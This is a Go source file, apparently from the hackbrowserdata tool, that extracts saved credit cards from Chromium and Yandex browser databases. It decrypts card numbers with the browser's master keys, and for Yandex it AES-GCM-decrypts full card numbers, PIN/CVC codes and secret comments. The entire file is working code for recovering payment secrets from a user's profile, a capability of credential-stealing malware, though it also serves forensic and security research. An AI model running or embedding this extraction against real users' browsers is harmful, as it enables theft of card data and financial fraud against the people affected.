package chromium

import (
	"database/sql"
	"encoding/json"
	"errors"

	"github.com/moond4rk/hackbrowserdata/crypto"
	"github.com/moond4rk/hackbrowserdata/crypto/keyretriever"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/types"
	"github.com/moond4rk/hackbrowserdata/utils/sqliteutil"
)

const (
	defaultCreditCardQuery = `SELECT COALESCE(guid, ''), name_on_card, expiration_month, expiration_year,
		card_number_encrypted, COALESCE(nickname, ''), COALESCE(billing_address_id, '') FROM credit_cards`
	countCreditCardQuery = `SELECT COUNT(*) FROM credit_cards`

	yandexCreditCardQuery      = `SELECT guid, public_data, private_data FROM records`
	yandexCreditCardCountQuery = `SELECT COUNT(*) FROM records`
)

// yandexPublicData is the plaintext JSON in records.public_data.
type yandexPublicData struct {
	CardHolder      string `json:"card_holder"`
	CardTitle       string `json:"card_title"`
	ExpireDateYear  string `json:"expire_date_year"`
	ExpireDateMonth string `json:"expire_date_month"`
}

// yandexPrivateData is the AES-GCM-sealed JSON in records.private_data.
type yandexPrivateData struct {
	FullCardNumber string `json:"full_card_number"`
	PinCode        string `json:"pin_code"`
	SecretComment  string `json:"secret_comment"`
}

func extractCreditCards(keys keyretriever.MasterKeys, path string) ([]types.CreditCardEntry, error) {
	cards, err := sqliteutil.QueryRows(path, false, defaultCreditCardQuery,
		func(rows *sql.Rows) (types.CreditCardEntry, error) {
			var guid, name, month, year, nickname, address string
			var encNumber []byte
			if err := rows.Scan(&guid, &name, &month, &year, &encNumber, &nickname, &address); err != nil {
				return types.CreditCardEntry{}, err
			}
			number, _ := decryptValue(keys, encNumber)
			return types.CreditCardEntry{
				GUID:     guid,
				Name:     name,
				Number:   string(number),
				ExpMonth: month,
				ExpYear:  year,
				NickName: nickname,
				Address:  address,
			}, nil
		})
	if err != nil {
		return nil, err
	}
	return cards, nil
}

// extractYandexCreditCards reads the records table (not Chromium's credit_cards). AAD = guid. See RFC-012 §4.
func extractYandexCreditCards(keys keyretriever.MasterKeys, path string) ([]types.CreditCardEntry, error) {
	dataKey, err := loadYandexDataKey(path, keys.V10)
	if err != nil {
		if errors.Is(err, errYandexMasterPasswordSet) {
			log.Warnf("%s: %v", path, err)
			return nil, nil
		}
		return nil, err
	}

	return sqliteutil.QueryRows(path, false, yandexCreditCardQuery,
		func(rows *sql.Rows) (types.CreditCardEntry, error) {
			var guid, publicData string
			var privateData []byte
			if err := rows.Scan(&guid, &publicData, &privateData); err != nil {
				return types.CreditCardEntry{}, err
			}

			var public yandexPublicData
			if publicData != "" {
				if err := json.Unmarshal([]byte(publicData), &public); err != nil {
					log.Debugf("yandex: parse public_data for %s: %v", guid, err)
				}
			}
			entry := types.CreditCardEntry{
				GUID:     guid,
				Name:     public.CardHolder,
				ExpMonth: public.ExpireDateMonth,
				ExpYear:  public.ExpireDateYear,
				NickName: public.CardTitle,
			}

			plaintext, err := crypto.AESGCMDecryptBlob(dataKey, privateData, yandexCardAAD(guid, nil))
			if err != nil {
				log.Debugf("yandex: decrypt card %s: %v", guid, err)
				return entry, nil
			}

			var private yandexPrivateData
			if err := json.Unmarshal(plaintext, &private); err != nil {
				log.Debugf("yandex: parse private_data for %s: %v", guid, err)
				return entry, nil
			}
			entry.Number = private.FullCardNumber
			entry.CVC = private.PinCode
			entry.Comment = private.SecretComment
			return entry, nil
		})
}

func countCreditCards(path string) (int, error) {
	return sqliteutil.CountRows(path, false, countCreditCardQuery)
}

func countYandexCreditCards(path string) (int, error) {
	return sqliteutil.CountRows(path, false, yandexCreditCardCountQuery)
}

// yandexCardAAD is the raw guid bytes (+ keyID if the profile has a master password).
func yandexCardAAD(guid string, keyID []byte) []byte {
	if len(keyID) == 0 {
		return []byte(guid)
	}
	out := make([]byte, 0, len(guid)+len(keyID))
	out = append(out, guid...)
	out = append(out, keyID...)
	return out
}
